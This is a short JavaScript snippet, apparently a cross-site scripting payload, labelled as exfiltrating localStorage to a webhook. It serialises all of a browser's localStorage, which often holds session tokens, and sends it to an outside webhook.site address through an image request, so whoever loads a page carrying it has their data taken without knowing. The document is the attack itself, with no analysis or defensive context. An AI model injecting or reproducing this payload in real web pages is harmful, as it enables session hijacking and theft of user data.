// Exfiltrate localStorage to webhook
var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
var d = encodeURIComponent(JSON.stringify(localStorage));
new Image().src = w + '?type=localstorage-exfil&d=' + d + '&ts=' + Date.now();
